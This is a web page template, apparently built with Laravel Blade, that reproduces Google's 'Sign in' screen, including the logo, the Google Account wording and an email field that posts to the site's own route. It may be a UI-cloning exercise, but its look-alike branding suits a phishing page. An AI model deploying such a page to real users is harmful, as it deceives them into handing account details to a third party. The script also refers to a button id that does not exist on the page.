<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google</title>
    <meta name="color-scheme" content="light dark">
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="login.css">
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <picture>
                <source srcset="{{ asset('R-dark.png')}}" media="(prefers-color-scheme: dark)">
                <img src="{{ asset('R.png')}}" alt="Google Logo" class="google-g">
            </picture>
            <div class="logo-text">
                <h1>Sign in</h1>
                <p class="subtitle">Use your Google Account</p>
            </div>
        </div>
        <div class="right-section">
            <form id="loginForm" method="POST" action="{{ route('login.submit') }}">
                @csrf
                <div class="input-group">
                    <input type="text" name="email" id="email" placeholder="Email or phone" required>
                </div>
                <div class="forgot-link">
                    <a href="#">Forgot email?</a>
                </div>
                <div class="info-text">
                    Not your computer? Use Guest mode to sign in privately.<br>
                    <a href="#">Learn more about using Guest mode</a>
                </div>
                <div class="submit-group">
                    <a href="{{ route('create') }}">Create account</a>
                    <button type="submit" class="btn">Next 
                    </button>
                    </div>
            </form>
        </div>
    </div>
    <footer>
        <span class="language">English (United States)</span>
        <span class="links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </span>
    </footer>

    <script>
        document.getElementById('nextBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            
            if (email && email.includes('@')) {
                
                localStorage.setItem('currentEmail', email);
                
            
                window.location.href = "{{ route('login.next') }}";
            } else {
                alert('Please enter a valid email address');
            }
        });
    </script>
</body>
</html>